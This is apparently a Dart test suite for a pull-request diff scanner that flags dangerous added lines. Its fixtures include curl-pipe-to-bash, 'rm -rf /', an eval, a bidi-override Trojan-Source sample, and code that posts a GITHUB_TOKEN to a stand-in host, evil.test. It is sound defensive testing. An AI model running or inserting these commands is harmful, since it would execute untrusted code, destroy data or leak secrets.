import 'package:cc_domain/features/pr_review/domain/services/diff_static_scanner.dart';
import 'package:cc_domain/features/pr_review/domain/value_objects/review_node_payload.dart';
import 'package:test/test.dart';

/// Builds a patch that adds [added] starting at head line [start].
String patchAdding(List<String> added, {int start = 10}) {
  final buf = StringBuffer('@@ -$start,1 +$start,${added.length + 1} @@\n')
    ..writeln(' context');
  for (final line in added) {
    buf.writeln('+$line');
  }
  return buf.toString();
}

void main() {
  const scanner = DiffStaticScanner();

  group('DiffStaticScanner', () {
    test('finds nothing in an empty or context-only diff', () {
      expect(scanner.scan(const {}), isEmpty);
      expect(scanner.scan({'a.sh': '@@ -1,2 +1,2 @@\n ctx\n ctx\n'}), isEmpty);
    });

    test('flags a curl-pipe-shell added by the PR', () {
      final findings = scanner.scan({
        'scripts/setup.sh': patchAdding(['curl https://x.test/i.sh | bash']),
      });
      expect(findings, hasLength(1));
      expect(findings.single.ruleId, 'curl_pipe_shell');
      expect(findings.single.filePath, 'scripts/setup.sh');
    });

    test('reports the real head-side line number', () {
      final findings = scanner.scan({
        'scripts/setup.sh': patchAdding([
          'echo safe',
          'curl https://x.test/i.sh | bash',
        ], start: 40),
      });
      // context at 40, then additions at 41 and 42.
      expect(findings.single.line, 42);
    });

    test('ignores a dangerous line that is only CONTEXT, not added', () {
      const patch =
          '@@ -10,3 +10,3 @@\n'
          ' curl https://x.test/i.sh | bash\n'
          '-old\n'
          '+new\n';
      expect(scanner.scan({'scripts/setup.sh': patch}), isEmpty);
    });

    test('ignores a dangerous line that was REMOVED by the PR', () {
      const patch =
          '@@ -10,2 +10,1 @@\n'
          ' ctx\n'
          '-curl https://x.test/i.sh | bash\n';
      expect(
        scanner.scan({'scripts/setup.sh': patch}),
        isEmpty,
        reason: 'deleting a dangerous line is a fix, not a finding',
      );
    });

    test('never assigns P0 — a regex must not block a merge alone', () {
      final findings = scanner.scan({
        'a.sh': patchAdding([
          'curl https://x.test/i.sh | bash',
          'rm -rf /',
          r'eval "$(something)"',
        ]),
      });
      expect(findings, isNotEmpty);
      expect(
        findings.every((f) => f.priority != ReviewNodePriority.p0),
        isTrue,
      );
    });

    test('quarantine rules outrank warn rules', () {
      final findings = scanner.scan({
        'a.sh': patchAdding([
          'npm install left-pad',
          'curl https://x.test/i.sh | bash',
        ]),
      });
      final byRule = {for (final f in findings) f.ruleId: f};
      expect(byRule['curl_pipe_shell']!.priority, ReviewNodePriority.p1);
      expect(byRule['package_install']!.priority, ReviewNodePriority.p2);
      // Sorted most severe first.
      expect(findings.first.priority, ReviewNodePriority.p1);
    });

    test('catches Trojan-Source bidi characters introduced by the PR', () {
      final findings = scanner.scan({
        // Escaped rather than literal: a raw RLO/PDI in this file would
        // reorder the source a human reads, which is the very trick the rule
        // exists to catch.
        'lib/auth.dart': patchAdding(['// \u202E dangerous \u202C']),
      });
      expect(findings.map((f) => f.ruleId), contains('bidi_override'));
    });

    test('fires secret-exfiltration only when BOTH halves are added', () {
      final both = scanner.scan({
        'lib/leak.dart': patchAdding([
          r'final token = env["GITHUB_TOKEN"];',
          'await http.post("https://evil.test", body: token);',
        ]),
      });
      expect(both.map((f) => f.ruleId), contains('secret_exfiltration'));

      // Only the egress half is new; the secret read is pre-existing context.
      const onlyEgress =
          '@@ -10,2 +10,3 @@\n'
          r' final token = env["GITHUB_TOKEN"];'
          '\n'
          ' ctx\n'
          '+await http.post("https://evil.test", body: token);\n';
      final partial = scanner.scan({'lib/leak.dart': onlyEgress});
      expect(
        partial.map((f) => f.ruleId),
        isNot(contains('secret_exfiltration')),
        reason: 'the diff introduced egress, not an exfiltration shape',
      );
    });

    test('deduplicates the same rule on the same line', () {
      final findings = scanner.scan({
        'a.sh': patchAdding(['curl https://x.test/i.sh | bash']),
      });
      final keys = findings.map((f) => f.dedupKey).toList();
      expect(keys.toSet(), hasLength(keys.length));
    });

    test('scans several files independently', () {
      final findings = scanner.scan({
        'a.sh': patchAdding(['curl https://x.test/i.sh | bash']),
        'b.sh': patchAdding(['rm -rf /']),
      });
      expect(findings.map((f) => f.filePath).toSet(), {'a.sh', 'b.sh'});
    });

    test('addedLinesBody positions added text at head line numbers', () {
      final body = scanner.addedLinesBody(patchAdding(['alpha'], start: 5));
      final lines = body.split('\n');
      // context at 5, addition at 6 → index 5 (0-based).
      expect(lines[5], 'alpha');
      expect(lines[0], '');
    });

    test('never throws on a malformed patch', () {
      expect(
        () => scanner.scan({'a.sh': 'not a diff at all', 'b.sh': '@@ bogus'}),
        returnsNormally,
      );
    });
  });
}
